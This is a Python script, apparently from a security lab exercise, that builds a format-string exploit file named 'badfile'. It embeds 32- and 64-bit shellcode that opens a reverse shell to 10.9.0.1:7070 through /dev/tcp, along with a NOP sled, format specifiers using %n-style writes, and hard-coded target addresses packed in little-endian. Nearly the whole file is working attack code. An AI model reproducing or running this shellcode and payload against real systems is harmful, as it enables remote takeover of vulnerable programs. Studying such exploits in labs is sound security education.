#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/7070 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/7070 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = N - len(shellcode)     # Change this number
############################################################
padding = 0
p2 = padding + 8
p3 = padding + 16
# This line shows how to store a 4-byte integer at offset 0

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
D1 = 0x7fff
D2 = 0xffff - 0x7fff
D3 = 0xe0f9
#Frame Pointer (inside myprintf):      0x00007fffffffe1e0

s = "%.lx."*96 + "%." + str(D1)+ "x" 
#s =  "%." + str(D1)+ "x"+ "%98$n"  + "%." + str(D2)+ "x"+ "%99$hn" + "%." + str(D3)+ "x"+ "%100$hn" 

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')

content[0:len(fmt)] = fmt
#address = 0x7fffffffe1b0 + 48
address = 0x0000555555558012
number  = address + 4
number2  = address + 2
number3  = address
content[padding:16 +padding]  =  (number).to_bytes(8,byteorder='little')
content[p2:8 +p2]  =  (number2).to_bytes(8,byteorder='little')
content[p3:8 +p3]  =  (number3).to_bytes(8,byteorder='little')


############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
